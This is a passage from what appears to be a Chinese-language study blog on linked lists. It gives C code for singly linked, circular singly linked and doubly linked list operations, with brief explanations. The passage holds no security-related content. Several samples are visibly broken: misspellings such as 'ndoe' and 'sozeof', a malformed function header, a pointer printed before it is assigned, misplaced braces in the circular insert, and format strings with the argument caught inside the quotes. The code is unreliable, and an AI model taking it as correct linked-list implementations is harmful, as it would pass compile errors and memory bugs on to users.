class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="function">node *<span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *head;</span><br><span class="line">    head = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出 带头结点的单链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = head-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表是空的！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表中各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查找第 i 个结点</span></span><br><span class="line"><span class="function">node *<span class="title">find_i</span><span class="params">(node *head,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">if</span>(i &lt; <span class="number">0</span>) </span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;不存在第 %d 个结点！\n&quot;</span>,i);  <span class="keyword">return</span> <span class="literal">NULL</span>;&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(i==<span class="number">0</span>)  <span class="comment">//刚好为头结点 由于是带头结点的单链表，则为 NULL</span></span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; i!=j)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入操作 在 第 i 个 结点之后插入 x</span></span><br><span class="line"><span class="function">node *<span class="title">insert</span><span class="params">(node *head,datatype x,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    node *p,*q;</span><br><span class="line">    q = find_i(head,i);</span><br><span class="line">    <span class="keyword">if</span>(!q) &#123;<span class="built_in">printf</span>(<span class="string">&quot;不存在第 %d 个结点！\n&quot;</span>,i); <span class="keyword">return</span> head;&#125;</span><br><span class="line">    p = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    p-&gt;info = x;</span><br><span class="line">    p-&gt;next = q-&gt;next;</span><br><span class="line">    q-&gt;next = p;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除操作</span></span><br><span class="line"><span class="function">node *<span class="title">delete</span><span class="params">(node *head,datatype x)</span></span>&#123;</span><br><span class="line">    ndoe *pre = head,*q;</span><br><span class="line">    q = head-&gt;next;  <span class="comment">//由于是带头结点</span></span><br><span class="line">    <span class="keyword">while</span>(q &amp;&amp; q-&gt;info != x)&#123;</span><br><span class="line">        pre = q;   <span class="comment">//使 pre 始终指向 p 的前驱</span></span><br><span class="line">        q = q-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(q)&#123;</span><br><span class="line">        pre-&gt;next = q-&gt;next;  <span class="comment">//删除</span></span><br><span class="line">        <span class="built_in">free</span>(q);     <span class="comment">//释放空间</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="循环单链表"><a href="#循环单链表" class="headerlink" title="循环单链表"></a>循环单链表</h3><p>如果仅仅是单链表的话，它只能从首指针开始，依次向后访问，而不能访问到它前面的结点，如果想要访问到任意的结点的话——&gt;循环单链表。</p><p>做法：设置表最后一个结点的指针域指向表中的第一个结点。</p><p>假设最后一个结点的位置是 p ，则 p-&gt;next = head;</p><h4 id="循环单链表的操作"><a href="#循环单链表的操作" class="headerlink" title="循环单链表的操作"></a>循环单链表的操作</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="function">node *<span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得 循环单链表 最后一个结点的 存储地址</span></span><br><span class="line"><span class="function">node *<span class="title">rear</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    <span class="keyword">if</span>(!head)</span><br><span class="line">        p = <span class="literal">NULL</span>; <span class="comment">//循环单链表 为空</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        p = head;</span><br><span class="line">        <span class="keyword">while</span>(p-&gt;next != head)</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    <span class="keyword">if</span>(!head)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;循环单链表是空的！\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;循环单链表中各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);  <span class="comment">//输出非空表中的 第一个 结点的值</span></span><br><span class="line">        p = head-&gt;next;<span class="comment">//使 p 指向第一个结点的下一个结点</span></span><br><span class="line">        <span class="keyword">while</span>(p != head)&#123;<span class="comment">//输出中间的结点值，直到回到第一个结点</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查找 值 是 x 的结点</span></span><br><span class="line"><span class="function">node *<span class="title">find_x</span><span class="params">(ndoe *head,datatype x)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    <span class="keyword">if</span>(!head)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;循环单链表是 空的 ！\n&quot;</span>); <span class="keyword">return</span> <span class="literal">NULL</span>;&#125;</span><br><span class="line">    q = head;</span><br><span class="line">    <span class="keyword">while</span>(q-&gt;next != head &amp;&amp; q-&gt;info != x)&#123;</span><br><span class="line">        q = q-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(q-&gt;info == x)</span><br><span class="line">        <span class="keyword">return</span> q;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入操作</span></span><br><span class="line"><span class="function">node *<span class="title">insert</span><span class="params">(node *head,datatype x,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    node *p,*q,*myrear;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    p = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    p-&gt;info = x;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;找不到指定位置！\n&quot;</span>);&#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">0</span> &amp;&amp; !head)&#123;<span class="comment">//插入之前循环单链表是空的，则插入后指针应指向自己</span></span><br><span class="line">        p-&gt;next = p;</span><br><span class="line">        head = p;</span><br><span class="line">        <span class="keyword">return</span> head; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">0</span> &amp;&amp; head)&#123;<span class="comment">//在非空的 循环单链表中  插入 到 最前面</span></span><br><span class="line">        myrear = rear(head);<span class="comment">//寻找 最后一个结点</span></span><br><span class="line">        p-&gt;next = head;<span class="comment">//将 p 作为 最后一个结点</span></span><br><span class="line">        myrear-&gt;next = p;</span><br><span class="line">        <span class="keyword">return</span> head;       </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span>(i&gt;<span class="number">0</span> &amp;&amp; !head)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无法找到指定位置插入!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span>(i&gt;<span class="number">0</span> &amp;&amp; head)&#123;<span class="comment">//在非空的 循环单链表中  插入 位置任意</span></span><br><span class="line">        q = head;</span><br><span class="line">        j = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i != j &amp;&amp; q-&gt;next != head)&#123;</span><br><span class="line">            q = q-&gt;next;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i != j)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;不存在第 %d 个结点，无法插入！&quot;</span>,i);</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            p-&gt;next = q-&gt;next;</span><br><span class="line">            q-&gt;next = p;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除操作  删除值是 x 的结点</span></span><br><span class="line"><span class="function">node *<span class="title">delete</span><span class="params">(node *head,datatype x)</span></span>&#123;</span><br><span class="line">    node *pre = <span class="literal">NULL</span>,*q;</span><br><span class="line">    <span class="keyword">if</span>(!head)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;循环单链表是空的！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    q = head;</span><br><span class="line">    <span class="keyword">while</span>(q-&gt;next != head &amp;&amp; q-&gt;info != x)&#123;</span><br><span class="line">        pre = q;</span><br><span class="line">        q = q-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(q-&gt;info != x)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;没有找到指定位置！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(q != head)&#123;</span><br><span class="line">            pre-&gt;next = q-&gt;next;</span><br><span class="line">            <span class="built_in">free</span>(q);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(head-&gt;next == head) &#123;<span class="built_in">free</span>(q); head = <span class="literal">NULL</span>;&#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                pre = head-&gt;next;</span><br><span class="line">                <span class="keyword">while</span>(pre-&gt;next != q) pre = pre-&gt;next;</span><br><span class="line">                head = head-&gt;next;</span><br><span class="line">                pre-&gt;next = head;</span><br><span class="line">                <span class="built_in">free</span>(q);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="题目：将一个-双链表-改成一个-循环-双链表"><a href="#题目：将一个-双链表-改成一个-循环-双链表" class="headerlink" title="题目：将一个  双链表  改成一个  循环 双链表"></a>题目：将一个  双链表  改成一个  循环 双链表</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span> *<span class="title">llink</span>,*<span class="title">rlink</span>;</span></span><br><span class="line">&#125;dnode;</span><br><span class="line"></span><br><span class="line"><span class="comment">//尾插法 创建带头结点的双链表</span></span><br><span class="line"><span class="function">dnode *<span class="title">creat_behind</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    dnode *head,*r,*s; <span class="comment">//注意：同时定义多个指针</span></span><br><span class="line">    datatype x;</span><br><span class="line">    head = r = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));<span class="comment">//建立双链表的头结点</span></span><br><span class="line">    head-&gt;llink = head-&gt;rlink = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输出双链表的内容：(以 0 结束)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        s = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;rlink = r-&gt;rlink; <span class="comment">//将新的结点 s 插入到双链表的末尾</span></span><br><span class="line">        s-&gt;llink = r;</span><br><span class="line">        r-&gt;rlink = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(dnode *head)</span></span>&#123;</span><br><span class="line">    dnode *p;</span><br><span class="line">p = head-&gt;rlink;  <span class="comment">//由于是带头结点的 所以 指向 head 的 下一个位置</span></span><br><span class="line">    <span class="keyword">while</span>(p != head)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">        p = p-&gt;rlink;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将一个  双链表  改成一个  循环 双链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change</span><span class="params">(dnode *head)</span></span>&#123;</span><br><span class="line">    dnode *r;</span><br><span class="line">    r = head;</span><br><span class="line">    <span class="keyword">while</span>(r-&gt;rlink)</span><br><span class="line">        r = r-&gt;rlink;</span><br><span class="line">    head-&gt;llink = r;</span><br><span class="line">    r-&gt;rlink = head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    dnode *pt;</span><br><span class="line">    pt = creat_behind();</span><br><span class="line">    change(pt);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;循环双链表的内容是：\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/05/w2KEWsoXftTZBa8.png" alt="image-20211005194850587"></p><h3 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h3><p>为了便于知道 链表中任意一个结点的 前驱结点 和 后继结点，我们再设一个指针域来指向该节点的前驱结点，从而形成了双链表。</p><p>双链表中，其结点  含有 三个域：info   llink   rlink</p><p><img src="https://i.loli.net/2021/10/03/nm8fFAcD5gqrICk.png" alt="image-20211003095857245"></p><h4 id="双链表的创建"><a href="#双链表的创建" class="headerlink" title="双链表的创建"></a>双链表的创建</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//尾插法 创建带头结点的双链表</span></span><br><span class="line"><span class="function">dnode *<span class="title">creat_behind</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    dnode *head,*r,*s; <span class="comment">//注意：同时定义多个指针</span></span><br><span class="line">    datatype x;</span><br><span class="line">    head = r = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));<span class="comment">//建立双链表的头结点</span></span><br><span class="line">    head-&gt;llink = head-&gt;rlink = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输出双链表的内容：(以 0 结束)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        s = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;rlink = r-&gt;rlink; <span class="comment">//将新的结点 s 插入到双链表的末尾</span></span><br><span class="line">        s-&gt;llink = r;</span><br><span class="line">        r-&gt;rlink = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="双链表的操作"><a href="#双链表的操作" class="headerlink" title="双链表的操作"></a>双链表的操作</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span> *<span class="title">llink</span>,*<span class="title">rlink</span>;</span></span><br><span class="line">&#125;dnode;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="function">dnode *<span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="keyword">void</span> dnode*(dnode *head)&#123;</span><br><span class="line">    dnode *p = head;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;双链表是空的！\n&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;双链表中各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">        p = p-&gt;rlink;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找 第 i 个结点</span></span><br><span class="line"><span class="function">dnode *<span class="title">find_i</span><span class="params">(dnode *head,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    dnode *p = head;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(i &lt; <span class="number">1</span>) &#123;<span class="built_in">printf</span>(<span class="string">&quot;第%d个结点位置不存在！\n,i&quot;</span>);<span class="keyword">return</span> <span class="literal">NULL</span>;&#125;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; i != j)&#123;</span><br><span class="line">        p = p-&gt;rlink;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;第%d个结点位置不存在！\n,i&quot;</span>);<span class="keyword">return</span> <span class="literal">NULL</span>;&#125;  <span class="comment">//为什么？？</span></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在 第 i 个结点后 插入 值为 x 的结点</span></span><br><span class="line"><span class="function">dnode *<span class="title">insert</span><span class="params">(dnode *head,datatype x,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    dnode *p,*q;</span><br><span class="line">    p = (dnode*)<span class="built_in">malloc</span>(sozeof(dnode));<span class="comment">//为新的结点分配空间</span></span><br><span class="line">    p-&gt;next = x; <span class="comment">//设置新的结点值</span></span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;  <span class="comment">//插入到第一个结点</span></span><br><span class="line">        p-&gt;llink = <span class="literal">NULL</span>;</span><br><span class="line">        p-&gt;rlink = head;</span><br><span class="line">        <span class="keyword">if</span>(!head)&#123;</span><br><span class="line">            head = p;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            head-&gt;llink = p;</span><br><span class="line">            head = p;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">q = find_i(head,i);</span><br><span class="line">    <span class="keyword">if</span>(!q) &#123;<span class="built_in">printf</span>(<span class="string">&quot;第 %d 个结点不存在，无法插入！\n&quot;</span>); <span class="keyword">return</span> head;&#125;</span><br><span class="line">    <span class="keyword">if</span>(q-&gt;rlink == <span class="literal">NULL</span>)&#123;  <span class="comment">//插到最后一个结点</span></span><br><span class="line">        p-&gt;rlink = q-&gt;rlink;</span><br><span class="line">        